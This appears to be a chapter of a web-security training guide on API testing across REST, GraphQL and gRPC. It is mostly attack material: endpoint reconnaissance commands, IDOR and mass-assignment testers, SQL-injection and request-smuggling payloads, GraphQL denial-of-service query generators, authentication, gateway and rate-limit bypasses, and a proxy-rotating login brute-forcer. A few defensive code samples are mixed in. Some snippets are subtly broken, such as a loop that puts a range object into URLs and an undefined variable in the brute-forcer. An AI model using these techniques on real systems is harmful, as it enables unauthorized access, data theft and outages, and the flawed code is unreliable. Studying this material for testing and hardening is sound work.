# API Security: Deep Technical Analysis

## 1. REST API Security Testing Methodology

### 1.1 API Reconnaissance

Comprehensive API testing begins with thorough reconnaissance to map the entire attack surface:

```bash
# Step 1: Discover API documentation endpoints
/api
/api-docs
/api/docs
/api/swagger
/api/swagger-ui
/api/swagger-ui.html
/api/v1/swagger-ui.html
/api/v2/swagger-ui.html
/api/v3/swagger-ui.html
/swagger-ui
/swagger-ui.html
/swagger-ui/index.html
/swagger-resources
/swagger-resources/configuration/ui
/v2/api-docs
/v3/api-docs
/openapi.json
/openapi.yaml
/.well-known/schema-discovery
/graphql
/graphiql
/graphql/console
/playground
/api/graphql
```

```bash
# Step 2: Extract API specification
curl -s https://target.com/v3/api-docs | jq .
curl -s https://target.com/swagger-resources | jq .
curl -s https://target.com/openapi.json | jq '.paths | keys'

# Step 3: Fuzz API endpoints
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
ffuf -u https://target.com/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt

# Step 4: Enumerate API versions
for version in v1 v2 v3 v4 v5 api beta alpha internal staging dev test uat; do
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/$version/"
done
```

### 1.2 Swagger/OpenAPI Specification Exploitation

```json
// openapi.json often reveals:
{
  "openapi": "3.0.0",
  "info": {
    "title": "Target API",
    "version": "1.0.0",
    "description": "Internal API for managing users and payments"
  },
  "servers": [
    {"url": "https://api.target.com"},           // Production
    {"url": "https://staging-api.target.com"},   // Staging (less security!)
    {"url": "https://dev-api.target.com"}        // Development (even less!)
  ],
  "paths": {
    "/api/v1/users": {
      "get": {
        "tags": ["admin"],                      // Admin endpoint
        "summary": "List all users",
        "security": [],                           // No auth required!
        "parameters": [
          {
            "name": "role",
            "in": "query",
            "schema": {"type": "string", "enum": ["user", "admin", "superadmin"]}
            // Reveals valid roles
          }
        ]
      }
    },
    "/api/v1/admin/users/{id}/delete": {
      "delete": {
        "tags": ["admin"],
        "security": [{"BearerAuth": []}],
        "responses": {"200": {"description": "User deleted"}}
        // Admin-only endpoint — test for IDOR
      }
    }
  },
  "components": {
    "securitySchemes": {
      "BearerAuth": {
        "type": "http",
        "scheme": "bearer",
        "bearerFormat": "JWT"
      },
      "ApiKeyAuth": {
        "type": "apiKey",
        "in": "header",
        "name": "X-API-Key"
        // Reveals authentication mechanism
      }
    },
    "schemas": {
      "User": {
        "type": "object",
        "properties": {
          "id": {"type": "integer"},
          "username": {"type": "string"},
          "email": {"type": "string"},
          "role": {"type": "string"},
          "password_hash": {"type": "string"},    // Sensitive field exposed
          "api_key": {"type": "string"},           // API key in schema
          "ssn": {"type": "string"}                // PII in schema
        }
      }
    }
  }
}
```

### 1.3 REST API CRUD Testing Matrix

Systematic testing requires covering all HTTP methods against all resource endpoints:

```python
# REST API CRUD testing framework
import requests
import json

class APITester:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url
        self.session = requests.Session()
        if auth_token:
            self.session.headers.update({"Authorization": f"Bearer {auth_token}"})
    
    def test_all_methods(self, endpoint, resource_id=None):
        """Test all HTTP methods against an endpoint."""
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD']
        url = f"{self.base_url}{endpoint}"
        if resource_id:
            url = f"{url}/{resource_id}"
        
        results = {}
        for method in methods:
            resp = self.session.request(method, url)
            results[method] = {
                'status': resp.status_code,
                'headers': dict(resp.headers),
                'body': resp.text[:500] if resp.text else None,
            }
            # Check for unexpected method acceptance
            if method in ['DELETE', 'PATCH'] and resp.status_code == 200:
                print(f"[!] {method} {url}: Accepted without authorization check?")
            
        return results
    
    def test_idor(self, endpoint, own_id, target_ids):
        """Test for IDOR by accessing other users' resources."""
        results = []
        for target_id in target_ids:
            url = f"{self.base_url}{endpoint}/{target_id}"
            resp = self.session.get(url)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('id') != own_id:
                    results.append({
                        'url': url,
                        'id': target_id,
                        'data': data,
                        'vulnerability': 'IDOR'
                    })
        return results
    
    def test_mass_assignment(self, endpoint):
        """Test for mass assignment by adding unexpected fields."""
        # Step 1: Get the normal resource
        resp = self.session.get(f"{self.base_url}{endpoint}/me")
        normal_data = resp.json()
        
        # Step 2: Try to update with additional fields
        update_data = normal_data.copy()
        update_data['role'] = 'admin'
        update_data['is_admin'] = True
        update_data['is_superuser'] = True
        update_data['email_verified'] = True
        update_data['password'] = 'newpassword123'
        update_data['api_key'] = 'overwritten_key'
        
        resp = self.session.patch(
            f"{self.base_url}{endpoint}/me",
            json=update_data
        )
        if resp.status_code == 200:
            updated = resp.json()
            for field in ['role', 'is_admin', 'is_superuser', 'email_verified']:
                if update_data[field] == updated.get(field):
                    print(f"[!] Mass Assignment: {field} was accepted!")
        
        return resp
```

---

## 2. GraphQL Security

### 2.1 GraphQL Fundamentals

GraphQL exposes a single endpoint (`/graphql` or `/api/graphql`) with a powerful query language that fundamentally changes the security model compared to REST:

```graphql
# GraphQL query — client specifies exact fields needed
query GetUser {
  user(id: 1) {
    name
    email
    posts {
      title
      comments {
        body
        author {
          name
          email
          salary      # Sensitive field
          ssn         # Extremely sensitive — should be restricted
        }
      }
    }
  }
}
```

The key security shift: in REST, the server defines what fields are returned. In GraphQL, the client defines what fields are returned. This creates new attack surfaces around field-level authorization.

### 2.2 Introspection Discovery

```graphql
# Full introspection query — maps the entire API schema
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
    }
  }
}
```

```bash
# Using introspection for reconnaissance
# Save introspection result to schema.json, then:
npx graphqlviz schema.json | dot -Tpng -o schema.png  # Visualize schema
npx get-graphql-schema https://target.com/graphql -o schema.graphql

# Inlanes (introspection disabled? try these):
# Some implementations have introspection enabled but disabled for __schema
query { __type(name: "User") { name fields { name type { name } } } }
# Or query individual types:
query { __type(name: "Mutation") { name fields { name } } }
```

### 2.3 GraphQL Injection

GraphQL queries can be vulnerable to injection when user input is concatenated into query strings:

```python
# Vulnerable: String interpolation in GraphQL resolver
def resolve_user(root, info, username):
    query = f"""
    SELECT id, name, email, salary 
    FROM users 
    WHERE username = '{username}'
    """
    result = db.execute(query)
    return result

# Attack: username = "' OR '1'='1' --"
# Resulting query: SELECT id, name, email, salary FROM users WHERE username = '' OR '1'='1' --'

# GraphQL-specific injection via query arguments:
query {
  user(search: "' OR 1=1 --") {
    name
    email
  }
}

# GraphQL injection via variables:
query UserSearch($search: String!) {
  user(search: $search) {
    name
    email
  }
}
# Variables: {"search": "' OR 1=1 --"}
```

### 2.4 Batch and Alias Abuse (DoS)

GraphQL allows batching multiple queries and using aliases, enabling denial-of-service attacks:

```graphql
# Alias abuse: same query with different aliases
query {
  user1: user(id: 1) { name email posts { title } }
  user2: user(id: 2) { name email posts { title } }
  user3: user(id: 3) { name email posts { title } }
  # ... can send hundreds of aliases in a single request
  user1000: user(id: 1000) { name email posts { title } }
}

# Deep nesting abuse: exponential resource consumption
query {
  user(id: 1) {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    # ... can nest 10+ levels deep
                    # Each level multiplies query cost exponentially
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

```python
# Automated GraphQL DoS query generator
def generate_alias_attack(entity_type, field_list, count=1000):
    """Generate a query with N aliases for the same operation."""
    aliases = [f"{entity_type}{i}" for i in range(count)]
    fields = " ".join(field_list)
    aliases_str = "\n".join(
        [f"  {alias}: {entity_type}(id: {i}) {{ {fields} }}" 
         for alias, i in zip(aliases, range(count))]
    )
    return f"query {{\n{aliases_str}\n}}"

def generate_deep_nesting(entity_type, nesting_depth=10):
    """Generate a deeply nested query for DoS."""
    def build_nested(depth):
        if depth == 0:
            return "id name"
        return f"id name posts {{ {build_nested(depth - 1)} }}"
    
    return f"query {{ user(id: 1) {{ {build_nested(nesting_depth)} }} }}"
```

### 2.5 Field Suggestion Leakage

```http
# When a GraphQL query contains a typo, some implementations suggest correct field names:
query {
  user(id: 1) {
    emial   # Typo
  }
}

# Response:
{
  "errors": [
    {
      "message": "Cannot query field \"emial\" on type \"User\". Did you mean \"email\"?",
      "locations": [{"line": 3, "column": 5}]
    }
  ]
}

# This reveals field names that should be hidden:
query {
  user(id: 1) {
    pass    # Typo for hidden field
  }
}

# Response might reveal:
# "Cannot query field \"pass\" on type \"User\". Did you mean \"password\", \"passwordHash\", \"pastAddresses\"?"
# This reveals: password, passwordHash, pastAddresses fields exist
```

### 2.6 GraphQL Authorization Bypass

```python
# Vulnerable: Field-level authorization not enforced
class UserType(DjangoObjectType):
    class Meta:
        model = User
        fields = "__all__"  # Exposes ALL model fields including salary, ssn, etc.
    
    # Even if sensitive fields are marked as internal:
    salary = graphene.Float()  # Not restricted at the type level
    ssn = graphene.String()     # Not restricted at the type level

class Query(graphene.ObjectType):
    user = graphene.Field(UserType, id=graphene.Int())
    
    def resolve_user(self, info, id):
        # Only checks if the user can query the User type
        # Does NOT check if the user can access specific fields
        return User.objects.get(id=id)

# Attack: Query sensitive fields directly
query {
  user(id: 1) {
    name
    email
    salary
    ssn
    passwordHash
    apiKey
  }
}
```

```python
# Secure: Field-level authorization
class UserType(DjangoObjectType):
    class Meta:
        model = User
    
    @staticmethod
    def resolve_salary(user, info):
        # Only HR and the user themselves can see salary
        if info.context.user.role not in ['hr', 'admin'] and info.context.user.id != user.id:
            raise Exception("Unauthorized access to salary field")
        return user.salary
    
    @staticmethod
    def resolve_ssn(user, info):
        # Only specific roles can see SSN
        if info.context.user.role not in ['compliance', 'admin']:
            raise Exception("Unauthorized access to SSN field")
        return user.ssn

# Additionally: implement query depth and complexity limiting
from graphql import GraphQLError
from graphql.execution import ExecutionResult

MAX_DEPTH = 7
MAX_COMPLEXITY = 500

def depth_limit_validator(query_ast):
    """Validate query depth doesn't exceed maximum."""
    def get_depth(node, current_depth=0):
        if current_depth > MAX_DEPTH:
            raise GraphQLError(f"Query depth exceeds maximum of {MAX_DEPTH}")
        if hasattr(node, 'selection_set') and node.selection_set:
            for selection in node.selection_set.selections:
                get_depth(selection, current_depth + 1)
    
    for definition in query_ast.definitions:
        get_depth(definition)
```

---

## 3. gRPC Security Considerations

### 3.1 gRPC Reconnaissance and Reflection

```bash
# gRPC reflection reveals all available services and methods
grpcurl -plaintext target.com:443 list
# Output:
# user.UserService
# order.OrderService
# admin.AdminService
# health.Health

# Describe a service
grpcurl -plaintext target.com:443 describe user.UserService
# Output:
# user.UserService is a service:
# service UserService {
#   rpc CreateUser(CreateUserRequest) returns (User);
#   rpc GetUser(GetUserRequest) returns (User);
#   rpc ListUsers(ListUsersRequest) returns (stream User);
#   rpc DeleteUser(DeleteUserRequest) returns (google.protobuf.Empty);
#   rpc UpdateUser(UpdateUserRequest) returns (User);
# }

# Describe message types
grpcurl -plaintext target.com:443 describe user.CreateUserRequest
# Output:
# user.CreateUserRequest is a message:
# message CreateUserRequest {
#   string username = 1;
#   string email = 2;
#   string role = 3;       // Reveals role field — mass assignment target
#   bool is_admin = 4;     // Reveals admin flag
# }
```

### 3.2 gRPC-Specific Vulnerabilities

```python
# gRPC message serialization attacks via protobuf
# Protobuf's varint encoding enables amplification
import grpc
import message_pb2  # Generated from .proto

# Normal request: 100 bytes
request = message_pb2.SearchRequest(query="test", page=1)

# Amplified request: Repeated fields can create massive objects
request = message_pb2.SearchRequest(
    query="test",
    page=1,
    filters=[message_pb2.Filter(field=f"field_{i}", value="x" * 10000) for i in range(10000)]
)
# Serialized size: ~100MB from a ~10KB request definition

# gRPC metadata header injection
metadata = (
    ('authorization', 'Bearer eyJhbGciOiJSUzI1NiJ9...'),
    ('x-forwarded-for', '127.0.0.1'),       # Spoof client IP
    ('x-request-id', '../../../etc/passwd'),  # Path traversal in metadata
    ('grpc-timeout', '999999999S'),          # Timeout amplification
)
```

---

## 4. API Authentication Bypass

### 4.1 Common Authentication Bypass Patterns

```http
# Bypass 1: Remove authentication header
GET /api/v1/users HTTP/1.1
Authorization: Bearer <invalid_token>
→ 401 Unauthorized

GET /api/v1/users HTTP/1.1
(no Authorization header)
→ 200 OK (authentication not enforced on this endpoint!)

# Bypass 2: HTTP method tampering
DELETE /api/v1/users/42 HTTP/1.1
Authorization: Bearer user_token
→ 403 Forbidden (user not authorized)

OPTIONS /api/v1/users/42 HTTP/1.1
Authorization: Bearer user_token
→ 200 OK (OPTIONS bypasses authorization check)

PUT /api/v1/users/42 HTTP/1.1
Authorization: Bearer user_token
→ 200 OK (PUT not restricted like DELETE)

# Bypass 3: Path manipulation
GET /api/v1/admin/dashboard HTTP/1.1
→ 403 Forbidden

GET /api/v1/admin/dashboard/ HTTP/1.1    → 200 OK (trailing slash bypass)
GET /api/v1/admin/dashboard? HTTP/1.1    → 200 OK (query string bypass)
GET /api/v1/admin/dashboard%2f HTTP/1.1  → 200 OK (URL-encoded slash)
GET /api/v1/admin/./dashboard HTTP/1.1   → 200 OK (path normalization)
GET /api/v1/Admin/Dashboard HTTP/1.1     → 200 OK (case sensitivity)
GET /api/v2/admin/dashboard HTTP/1.1      → 200 OK (API version bypass)
```

### 4.2 API Key Vulnerabilities

```http
# API key in URL (visible in logs, Referer headers, browser history)
GET /api/v1/users?api_key=sk_live_1234567890abcdef HTTP/1.1

# API key exposed in client-side JavaScript
<script>
const API_KEY = "AIzaSy...";
fetch(`https://api.target.com/v1/search?key=${API_KEY}&q=${query}`);
</script>

# API key in response headers
HTTP/1.1 200 OK
X-API-Key: sk_live_1234567890abcdef
X-Request-Id: abc123

# API key rate limiting bypass
# If rate limiting is per API key but API keys are free to create:
for i in range(1000):
    new_key = register_new_account()  # Free API key
    results = api_request(new_key, endpoint)
    # Each key used once: no rate limiting triggered
```

### 4.3 Mass Assignment

```http
# Normal user registration
POST /api/v1/users HTTP/1.1
Content-Type: application/json
Authorization: Bearer user_token

{
  "username": "alice",
  "email": "alice@example.com",
  "password": "SecureP@ss1"
}

→ Response: {"id": 42, "username": "alice", "role": "user"}

# Mass assignment attack: include unexpected fields
POST /api/v1/users HTTP/1.1
Content-Type: application/json
Authorization: Bearer user_token

{
  "username": "alice",
  "email": "alice@example.com",
  "password": "SecureP@ss1",
  "role": "admin",
  "is_admin": true,
  "is_verified": true,
  "credit": 10000,
  "api_key": "overwritten_key"
}

→ Response: {"id": 42, "username": "alice", "role": "admin", "is_admin": true}
```

```python
# Mass assignment prevention (Django)
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['id', 'username', 'email']  # Whitelist: only these fields are accepted
        read_only_fields = ['id']              # ID is read-only even in whitelisted fields
        # NEVER use fields = '__all__' with models containing sensitive fields

# Mass assignment prevention (Express.js)
const allowedFields = ['username', 'email', 'password'];  // Whitelist
const filteredBody = {};
for (const field of allowedFields) {
    if (req.body[field] !== undefined) {
        filteredBody[field] = req.body[field];
    }
}
const user = await User.create(filteredBody);
```

---

## 5. Rate Limiting Bypass

### 5.1 Rate Limit Evasion Techniques

```http
# Technique 1: IP rotation via X-Forwarded-For
GET /api/v1/login HTTP/1.1
X-Forwarded-For: 10.0.0.1

GET /api/v1/login HTTP/1.1
X-Forwarded-For: 10.0.0.2

GET /api/v1/login HTTP/1.1
X-Forwarded-For: 10.0.0.3

# Technique 2: Varying headers to bypass fingerprinting
GET /api/v1/login HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...

GET /api/v1/login HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) ...

# Technique 3: API path variations
/api/v1/login
/api/v1/Login
/api/v1/login/
/api/v1/auth/login
/api/v2/login
/api/v1/users/authenticate

# Technique 4: HTTP parameter pollution
/api/v1/login?username=admin&password=wrong1
/api/v1/login?username=admin&password=wrong2&username=admin
/api/v1/login?username[]=admin&password[]=wrong3

# Technique 5: Race condition (concurrent requests)
# If rate limit resets on successful login:
import asyncio
import aiohttp

async def brute_force(session, url, username, passwords):
    for password in passwords:
        # Try password, if rate limited, do a successful reset
        tasks = []
        for pw in [password, valid_password]:  # Include known valid password
            tasks.append(session.post(url, json={"username": username, "password": pw}))
        responses = await asyncio.gather(*tasks)
        # Rate limit resets after successful login
```

### 5.2 Advanced Rate Limit Bypass

```python
# Technique 6: Distributed rate limiting bypass via IP spoofing
import requests

proxies = [
    "http://proxy1:8080",
    "http://proxy2:8080",
    # ... thousands of proxy IPs from proxy rotation service
]

for proxy in proxies:
    session = requests.Session()
    session.proxies = {"http": proxy, "https": proxy}
    resp = session.post(
        "https://target.com/api/v1/login",
        json={"username": "admin", "password": "password_attempt"}
    )
    if resp.status_code == 200:
        print(f"[+] Password found: {password_attempt}")
        break

# Technique 7: JSON payload variations
# Same password, different JSON representations:
{"username": "admin", "password": "test"}         # Standard
{"username": "admin", "password": "test", " ": ""}  # Extra whitespace key
{"username": "admin", "password": "test\n"}        # Newline
{"username": "admin", "password": "test", "extra": 0}  # Extra field
```

---

## 6. BOLA and BFLA

### 6.1 Broken Object Level Authorization (BOLA)

BOLA (IDOR in OWASP API Security terminology) occurs when an API endpoint doesn't properly validate that the requesting user has access to the requested object:

```http
# Normal request: User accesses their own profile
GET /api/v1/users/42/profile HTTP/1.1
Authorization: Bearer user_42_token
→ 200 OK (user 42's profile)

# BOLA attack: User 42 accesses user 1's profile
GET /api/v1/users/1/profile HTTP/1.1
Authorization: Bearer user_42_token
→ 200 OK (user 1's profile — should be 403 Forbidden!)

# BOLA with UUID (harder but not impossible to guess)
GET /api/v1/users/550e8400-e29b-41d4-a716-446655440000/profile HTTP/1.1
Authorization: Bearer user_token
→ 200 OK (if UUIDs are predictable from other data leaks)

# BOLA with encrypted IDs
GET /api/v1/users/eyJpZCI6MX0=/profile HTTP/1.1
# If encryption is reversible (ECB mode, predictable IV):
import base64
base64.b64decode('eyJpZCI6MX0=')  # {"id":1}  — unencrypted base64!
```

```python
# Systematic BOLA testing
import requests
import uuid

def test_bola(base_url, own_token, resource_type, own_id, test_ids):
    """Test BOLA across multiple object IDs."""
    results = []
    headers = {"Authorization": f"Bearer {own_token}"}
    
    for test_id in test_ids:
        url = f"{base_url}/api/v1/{resource_type}/{test_id}"
        resp = requests.get(url, headers=headers)
        
        if resp.status_code == 200:
            data = resp.json()
            # Check if the data belongs to a different user
            if data.get('id') != own_id and data.get('user_id') != own_id:
                results.append({
                    'url': url,
                    'id': test_id,
                    'status': resp.status_code,
                    'sensitive_fields': [
                        k for k in data.keys() 
                        if k in ['email', 'phone', 'ssn', 'password_hash', 
                                 'api_key', 'credit_card', 'address']
                    ]
                })
    
    # Test IDOR across resource types
    for resource in ['users', 'orders', 'transactions', 'documents', 'reports']:
        for id_range in [range(1, 100), ['me', 'admin', 'superadmin']]:
            url = f"{base_url}/api/v1/{resource}/{id_range}"
            resp = requests.get(url, headers=headers)
            if resp.status_code == 200:
                results.append({
                    'url': url,
                    'resource': resource,
                    'status': resp.status_code
                })
    
    return results
```

### 6.2 Broken Function Level Authorization (BFLA)

BFLA occurs when an API allows regular users to access administrative functions:

```http
# Regular user attempting admin function
GET /api/v1/admin/users HTTP/1.1
Authorization: Bearer regular_user_token
→ 200 OK (admin endpoint accessible to regular user!)

# Common BFLA patterns:
/api/v1/admin/dashboard
/api/v1/admin/users/export
/api/v1/admin/config
/api/v1/admin/debug
/api/v1/internal/metrics
/api/v1/system/logs
/api/v1/system/config

# BFLA via HTTP method manipulation:
# DELETE restricted, but PUT allowed on the same resource
DELETE /api/v1/users/42 HTTP/1.1
Authorization: Bearer regular_user
→ 403 Forbidden

PUT /api/v1/users/42 HTTP/1.1
Authorization: Bearer regular_user
Content-Type: application/json
{"active": false}
→ 200 OK (deactivation via PUT works!)
```

---

## 7. API Versioning Security

```http
# API versioning bypasses
# If v2 is more restrictive than v1:
GET /api/v2/users/42 HTTP/1.1
Authorization: Bearer user_token
→ 403 Forbidden

GET /api/v1/users/42 HTTP/1.1
Authorization: Bearer user_token
→ 200 OK (v1 has weaker authorization!)

# Common versioning patterns:
/api/v1/users/42          → URL path versioning
/api/users/42?version=1   → Query parameter versioning  
/api/users/42             → Header versioning (Accept: application/vnd.api.v1+json)

# Testing all version variants:
for version in ['v1', 'v2', 'v3', 'v4', 'v5', 'beta', 'alpha', 'internal', 'staging', 'dev']:
    for endpoint in ['/users', '/admin', '/debug', '/config']:
        url = f"https://api.target.com/{version}{endpoint}"
        resp = requests.get(url, headers={"Authorization": f"Bearer {token}"})
        if resp.status_code != 404:
            print(f"[+] Found: {url} → {resp.status_code}")
```

---

## 8. API Gateway Security

### 8.1 API Gateway Attack Surface

API gateways (Kong, Apigee, AWS API Gateway, Envoy) serve as the single entry point for all API traffic:

```
[Client] → [API Gateway] → [Service A]
                          → [Service B]
                          → [Service C]
```

Gateway security concerns:

```yaml
# Kong API Gateway misconfigurations
# 1. Admin API exposed externally (default: 127.0.0.1:8001)
# Attack: curl http://target.com:8001/routes
# Lists all configured routes, upstreams, and plugins

# 2. JWT plugin misconfiguration
plugins:
  - name: jwt
    config:
      key_claim_name: iss        # Which claim holds the key ID
      claims_to_verify:
        - exp                    # Verify expiration only (not nbf, iat)
      # Missing: key verification, algorithm restriction
      # Attack: Set "alg": "none" or "HS256" when RS256 expected

# 3. Rate limiting plugin misconfiguration
plugins:
  - name: rate-limiting
    config:
      minute: 100                # 100 requests per minute per IP
      policy: local              # Local policy: per-Kong-node rate limiting
      # Attack: If multiple Kong nodes, rate limit resets per node
      # Should use: policy: redis (cluster-wide rate limiting)
```

### 8.2 API Gateway Bypass

```http
# Gateway routing bypass via HTTP method override
DELETE /api/v1/users/42 HTTP/1.1
X-HTTP-Method-Override: PUT
→ Gateway sees DELETE (blocked), backend sees PUT (allowed)

# Gateway bypass via path manipulation
Gateway blocks: /api/v1/admin/dashboard
Bypass attempts:
  /api/v1/admin/dashboard/         → trailing slash
  /api/v1/admin/dashboard%2f        → URL-encoded slash
  /api/v1/admin/dashboard?          → empty query string
  /api/v1/admin/./dashboard          → dot-segment
  /api/v1/admin/..;/dashboard       → Tomcat path traversal
  /api/v1/Admin/dashboard           → case variation
  /api/v2/admin/dashboard           → version bypass

# Gateway bypass via content-type confusion
Gateway validates: application/json body for SQL injection patterns
Bypass: Send as application/xml → gateway may not inspect XML body
POST /api/v1/users HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<user>
  <username>admin' OR '1'='1</username>
  <password>anything</password>
</user>

# Gateway bypass via chunked transfer encoding
POST /api/v1/users HTTP/1.1
Transfer-Encoding: chunked
Content-Type: application/json

7\r\n
{"user"\r\n
9\r\n
":"admin"}\r\n
0\r\n
\r\n
# Gateway may reassemble differently than backend (HTTP request smuggling)
```

---

## Cross-Reference Guide

| Topic | Cross-Reference |
|-------|-----------------|
| SSRF for internal API access | `03a_ssrf_csrflfi.md` |
| Authentication bypass | `02b_authentication_authorization.md` |
| Mass assignment and IDOR | `01b_owasp_top10_deep_dive.md` (A01) |
| GraphQL injection | `02a_injection_attacks.md` |
| WAF bypass for APIs | `05b_waf_bypass_techniques.md` |
| Client-side API security | `04a_client_side_security.md` |
| Testing methodology | `06a_web_security_testing.md` |
| Hardening techniques | `06b_web_hardening_defense.md` |

---

*API security requires understanding that APIs are not merely "websites without UI" — they have unique attack surfaces including introspection, batching, field-level authorization, and protocol-specific vulnerabilities. REST, GraphQL, and gRPC each demand distinct testing approaches.*

---

## References

1. OWASP Foundation. "OWASP API Security Top 10 (2023)." https://owasp.org/API-Security/
2. OWASP Foundation. "API Security." https://owasp.org/www-project-api-security/
3. GraphQL Foundation. "GraphQL Specification." https://spec.graphql.org/
4. PortSwigger Ltd. "GraphQL API Vulnerabilities." https://portswigger.net/web-security/graphql
5. Nilesh G. "GraphQL Security — Bypassing Authorization." https://doyensec.com/resources/
6. gRPC Project. "gRPC Security." https://grpc.io/docs/guides/auth/
7. OWASP Foundation. "Mass Assignment Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
8. RFC 6749. "The OAuth 2.0 Authorization Framework." IETF, October 2012. https://www.rfc-editor.org/rfc/rfc6749
9. PortSwigger Ltd. "API Testing." https://portswigger.net/web-security/api-testing
10. Inon Shkedy. "API Security Testing Methodology." https://dana-security.com/api-security-testing/
11. OWASP Foundation. "REST Security Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html